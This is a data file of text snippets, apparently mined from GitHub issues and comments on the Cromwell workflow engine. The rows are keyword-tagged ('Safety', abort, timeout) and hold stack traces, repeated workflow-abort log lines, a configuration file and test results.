com.getsentry.raven.event.EventBuilder$HostnameCache.getHostname(EventBuilder.java:477); 	at com.getsentry.raven.event.EventBuilder.autoSetMissingValues(EventBuilder.java:97); 	at com.getsentry.raven.event.EventBuilder.build(EventBuilder.java:410); 	at com.getsentry.raven.logback.SentryAppender.buildEvent(SentryAppender.java:324); 	at com.getsentry.raven.logback.SentryAppender.append(SentryAppender.java:230); 	at com.getsentry.raven.logback.SentryAppender.append(SentryAppender.java:37); 	at ch.qos.logback.core.AppenderBase.doAppend(AppenderBase.java:82); 	at ch.qos.logback.core.spi.AppenderAttachableImpl.appendLoopOnAppenders(AppenderAttachableImpl.java:51); 	at ch.qos.logback.classic.Logger.appendLoopOnAppenders(Logger.java:270); 	at ch.qos.logback.classic.Logger.callAppenders(Logger.java:257); 	at ch.qos.logback.classic.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3774:2519,Timeout,TimeoutException,2519,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3774,1,['Timeout'],['TimeoutException']
Safety,"24:11,079 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:16,358 cromwell-system-ak",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:2348,Abort,Abort,2348,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:16,358 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:21,379 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:26,399 cromwell-system-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:2651,Abort,Abort,2651,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:16,358 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:21,379 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:26,399 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:31,419 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:36,439 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:2955,Abort,Abort,2955,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:16,358 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:21,379 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:26,399 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:31,419 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:36,439 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:41,459 cromwell-system-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:3107,Abort,Abort,3107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:16,358 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:21,379 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:26,399 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:31,419 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:36,439 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:41,459 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:46,479 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:3259,Abort,Abort,3259,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"28000000; }. # If 'true', a SIGTERM or SIGINT will trigger Cromwell to attempt to gracefully shutdown in server mode,; # in particular clearing up all queued database writes before letting the JVM shut down.; # The shutdown is a multi-phase process, each phase having its own configurable timeout. See the Dev Wiki for more details.; 	graceful-server-shutdown = true; max-concurrent-workflows = 5000. io {; throttle {; # # Global Throttling - This is mostly useful for GCS and can be adjusted to match; # # the quota availble on the GCS API; number-of-requests = 100000; per = 100 seconds; }; }; }. akka {; # Optionally set / override any akka settings; http {; server {; # Increasing these timeouts allow rest api responses for very large jobs; # to be returned to the user. When the timeout is reached the server would respond; # `The server was not able to produce a timely response to your request.`; # https://gatkforums.broadinstitute.org/wdl/discussion/10209/retrieving-metadata-for-large-workflows; request-timeout = 600s; idle-timeout = 600s; }; }; }. services {; MetadataService {; #class = ""cromwell.services.metadata.impl.MetadataServiceActor""; config {; metadata-read-row-number-safety-threshold = 2000000; # # For normal usage the default value of 200 should be fine but for larger/production environments we recommend a; # # value of at least 500. There'll be no one size fits all number here so we recommend benchmarking performance and; # # tuning the value to match your environment.; db-batch-size = 700; }; }; }. google {. application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. docker {; hash-lookup {; method = ""remote""; }; }. engine {; filesystems {; gcs {; auth = ""application-default""; }; }; }. call-caching {; enabled = true; }. backend {; default = GCPBATCH; providers {; GCPBATCH {; // life sciences; actor-factory = ""cromwell.backend.google.batch.GcpBatchBackendLifecycleActorFactory""; config {; ## Google projec",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356:8861,timeout,timeout,8861,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356,2,['timeout'],['timeout']
Safety,"28a:myworkflow.mytask:-1:1 is not eligible for call caching; ```; <!-- Which backend are you running? -->; Used backend: ; GCPBATCH. Callcaching works with PAPIv2, not on GCPBATCH.; <!-- Paste/Attach your workflow if possible: -->; workflow used for testing:; ```; workflow myworkflow {; call mytask; }. task mytask {; String str = ""!""; command <<<; echo ""hello world ${str}""; >>>; output {; String out = read_string(stdout()); }. runtime{; docker: ""eu.gcr.io/project/image_name:tag""; cpu: ""1""; memory: ""500 MB""; disks: ""local-disk 5 HDD""; zones: ""europe-west1-b europe-west1-c europe-west1-d""; preemptible: 2; noAddress: true; }; }; ```; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; We are using cromwell through broadinstitute/cromwell:87-ecd44b6 image.; cromwell configuration:; ```; include required(classpath(""application"")). system.new-workflow-poll-rate=1. // increase timeout for http requests..... getting meta-data can timeout for large workflows.; akka.http.server.request-timeout=600s. # Maximum number of input file bytes allowed in order to read each type.; # If exceeded a FileSizeTooBig exception will be thrown.; system {; 	job-rate-control {; 	 jobs = 100; 	 per = 1 second; 	}; input-read-limits {; lines = 128000000; bool = 7; int = 19; float = 50; string = 1280000; json = 12800000; tsv = 1280000000; map = 128000000; object = 128000000; }. # If 'true', a SIGTERM or SIGINT will trigger Cromwell to attempt to gracefully shutdown in server mode,; # in particular clearing up all queued database writes before letting the JVM shut down.; # The shutdown is a multi-phase process, each phase having its own configurable timeout. See the Dev Wiki for more details.; 	graceful-server-shutdown = true; max-concurrent-workflows = 5000. io {; throttle {; # # Global Throttling - This is mostly useful for GCS and can be adjusted to match; # # the quota availble on the GCS API; number-of-requests = 100000; per = 100 se",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356:7426,timeout,timeout,7426,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356,1,['timeout'],['timeout']
Safety,"3 minutes, 4 seconds); - should successfully run inline_file_custom_entryname *** FAILED *** (3 minutes, 9 seconds); - should successfully run iwdr_input_string *** FAILED *** (3 minutes, 10 seconds); - should successfully run iwdr_input_string_function *** FAILED *** (2 minutes, 59 seconds); - should successfully run non_root_default_user *** FAILED *** (3 minutes, 20 seconds); - should successfully run relative_output_paths *** FAILED *** (2 minutes, 42 seconds); - should successfully run space *** FAILED *** (4 minutes, 18 seconds); - should successfully run standard_output_paths_colliding_prevented *** FAILED *** (3 minutes, 1 second); - should successfully run three_step_cwl *** FAILED *** (5 minutes, 29 seconds); - should NOT call cache the second run of readFromCacheFalse (3 minutes, 21 seconds); - should abort a workflow immediately after submission abort.instant_abort (5 seconds, 52 milliseconds); - should abort a workflow mid run abort.scheduled_abort (2 minutes, 20 seconds); - should abort a workflow mid run abort.sub_workflow_abort (3 minutes, 2 seconds); - should call cache the second run of cacheBetweenWF (2 minutes, 55 seconds); - should call cache the second run of call_cache_hit_prefixes_no_hint (1 minute, 40 seconds); - should call cache the second run of floating_tags (3 minutes, 25 seconds); - should fail during execution bad_docker_name (35 seconds, 238 milliseconds); - should fail during execution bad_workflow_failure_mode (5 seconds, 920 milliseconds); - should fail during execution chainfail (42 seconds, 454 milliseconds); - should fail during execution cont_while_possible (3 minutes, 57 seconds); - should fail during execution cont_while_possible_scatter (2 minutes, 27 seconds); - should fail during execution draft3_read_file_limits (3 minutes, 26 seconds); - should fail during execution empty_filename (16 seconds, 333 milliseconds); - should fail during execution failing_continue_on_return_code (55 seconds, 180 milliseconds); - should fail d",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132:2711,abort,abort,2711,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132,2,['abort'],['abort']
Safety,"30,919 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:35,939 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:40,959 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:45,978 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:50,999 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:23:56,019 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:01,039 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:06,058 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:11,079 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:1134,Abort,Abort,1134,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"35,939 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:40,959 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:45,978 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:50,999 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:23:56,019 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:01,039 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:06,058 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:11,079 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:1286,Abort,Abort,1286,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:46,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:47,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:48,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:49,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:50,94] [info] Waiting for 1 workflows to abort...; ^C[2016-10-27 13:10:51,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:52,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:53,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:54,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:55,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:56,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:57,16] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClient",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:16724,abort,abort,16724,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"3:56,019 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:01,039 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:06,058 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:11,079 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:1893,Abort,Abort,1893,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
